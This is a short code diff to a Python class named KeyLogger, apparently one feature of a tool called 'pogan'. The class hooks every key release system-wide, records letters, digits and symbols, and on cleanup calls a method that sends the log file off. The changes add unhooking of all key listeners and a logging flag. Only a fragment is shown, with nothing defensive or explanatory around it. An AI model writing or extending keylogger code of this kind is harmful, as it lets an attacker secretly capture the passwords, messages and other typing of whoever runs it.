@@ -1,13 +1,13 @@
 from string import ascii_letters, digits
 from threading import Thread, Semaphore
-from keyboard import on_release
+from keyboard import on_release, unhook_all
 
 from pogan_feature import PoganFeature
 
 
 class KeyLogger(PoganFeature):
-    def __init__(self, filename: str, log_dir: str):
-        super().__init__("", filename, log_dir)
+    def __init__(self, filename: str, log_dir: str, log=True):
+        super().__init__("", filename, log_dir, log)
 
         self.alphabet = ascii_letters + digits + '!@#$%^&*()-+{}[]\';:\"<>/\\~`'
         self.semaphore = Semaphore(0)
@@ -17,8 +17,8 @@ class KeyLogger(PoganFeature):
         self.runner_thread.start()
 
     def clean(self):
+        unhook_all()
         self.send_logfile()
-        self.runner_thread.join()
 
     def capture_keys(self):
         on_release(callback=self.on_keypress)
